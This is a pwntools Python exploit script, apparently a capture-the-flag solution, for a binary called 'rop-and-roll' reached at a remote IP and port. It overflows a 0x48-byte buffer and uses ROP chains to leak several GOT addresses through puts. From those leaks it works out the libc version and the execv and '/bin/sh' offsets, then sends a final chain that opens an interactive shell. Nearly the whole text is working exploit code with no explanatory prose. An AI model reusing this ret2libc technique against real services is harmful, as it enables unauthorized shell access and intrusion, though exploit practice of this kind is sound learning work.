# RazviOverflow
# Python3

from pwn import *

elf = ELF("./rop-and-roll")

print(elf.symbols)

puts_plt = p64(elf.plt[b'puts'])
puts_got = p64(elf.got[b'puts'])
fgets_got = p64(elf.got[b'fgets'])
strcmp_got = p64(elf.got[b'strcmp'])
fflush_got = p64(elf.got[b'fflush'])
__isoc99_sscanf_got = p64(elf.got[b'__isoc99_sscanf'])
putchar_got = p64(elf.got[b'putchar'])
function_address = p64(elf.symbols[b'function1'])

pop_rdi_gadget = p64(0x00000000004012db) # pop rdi ; ret
pop_rsi_pop_r15_gadget = p64(0x00000000004012d9) # pop rsi ; pop r15 ; ret

payload = b'A' * 0x40 + b'B' * 0x08 + pop_rdi_gadget + puts_got + puts_plt + function_address
payload2 = b'A' * 0x40 + b'B' * 0x08 + pop_rdi_gadget + fgets_got + puts_plt + function_address
payload3 = b'A' * 0x40 + b'B' * 0x08 + pop_rdi_gadget + strcmp_got + puts_plt + function_address
payload4 = b'A' * 0x40 + b'B' * 0x08 + pop_rdi_gadget + fflush_got + puts_plt + function_address
payload5 = b'A' * 0x40 + b'B' * 0x08 + pop_rdi_gadget + __isoc99_sscanf_got + puts_plt + function_address
payload6 = b'A' * 0x40 + b'B' * 0x08 + pop_rdi_gadget + putchar_got + puts_plt + function_address

#binary = process("./rop-and-roll")

binary = remote("167.99.252.86",8002)

'''
b',[*]WARNING 1337 ERROR\n'
Address of PUTS -> 0x7f1dfcafaa30
Address of FGETS -> 0x7f1dfcaf8b90
Address of STRCMP -> 0x7f1dfcb23ee0
Address of FFLUSH -> 0x7f1dfcaf8850
Address of __isoc99_sscanf_got -> 0x7f1dfcaf6550
Address of PUTCHAR -> 0x7f1dfcafc880
[*] Switching to interactive mode

Using only putchar - 880 and puts - a30 on https://libc.nullbyte.cat/?q=putchar%3A880%2Cputs%3Aa30&l=libc6_2.27-3ubuntu1.2_amd64
detects it as libc6_2.27-3ubuntu1.2_amd64

https://libc.blukat.me/?q=puts%3Aff0%2Cfgets%3A430 says
detects it as libc6-i386_2.8~20080505-0ubuntu9_amd64
'''

print(binary.recv())
binary.sendline("DEBUG-SYSTEM")
print(binary.recv())
binary.sendline(payload)
puts_address = u64(binary.recv().strip().ljust(8, b"\x00"))
print("Address of PUTS -> " + str(hex(puts_address)))
binary.sendline(payload2)
print("Address of FGETS -> " + str(hex(u64(binary.recv().strip().ljust(8, b"\x00")))))
binary.sendline(payload3)
strcmp_address = u64(binary.recv().strip().ljust(8, b"\x00"))
print("Address of STRCMP -> " + str(hex(strcmp_address)))
binary.sendline(payload4)
print("Address of FFLUSH -> " + str(hex(u64(binary.recv().strip().ljust(8, b"\x00")))))
binary.sendline(payload5)
print("Address of __isoc99_sscanf_got -> " + str(hex(u64(binary.recv().strip().ljust(8, b"\x00")))))
binary.sendline(payload6)
print("Address of PUTCHAR -> " + str(hex(u64(binary.recv().strip().ljust(8, b"\x00")))))


# All addresses are relative to puts 

#Remote
#system_address = p64(puts_address - 0x31550)

execv_address = p64(puts_address + 0x645d0)
str_bin_sh_address = p64(puts_address + 0x1336ca)

#system_address = p64(puts_address - 0x28260)

#execve_address = p64(puts_address + 0x3c6d0)
#str_bin_sh_address = p64(puts_address + 0xdad47)

#system_address = p64(strcmp_address - 0x427c0)
#str_bin_sh_address = p64(strcmp_address + 0xc8d6c)

# Local values
#system_address = p64(puts_address - 0x2d780)
#str_bin_sh_address = p64(puts_address + 0x1121bc)
#execve_address = p64(puts_address + 0x55140)
#execv_address = p64(puts_address + 0x552a0)


definitive_payload = b'A' * 0x40 + b'B' * 0x08 + pop_rdi_gadget + str_bin_sh_address + pop_rsi_pop_r15_gadget + p64(0x00) + p64(0x00) + execv_address

binary.sendline(definitive_payload)
binary.interactive()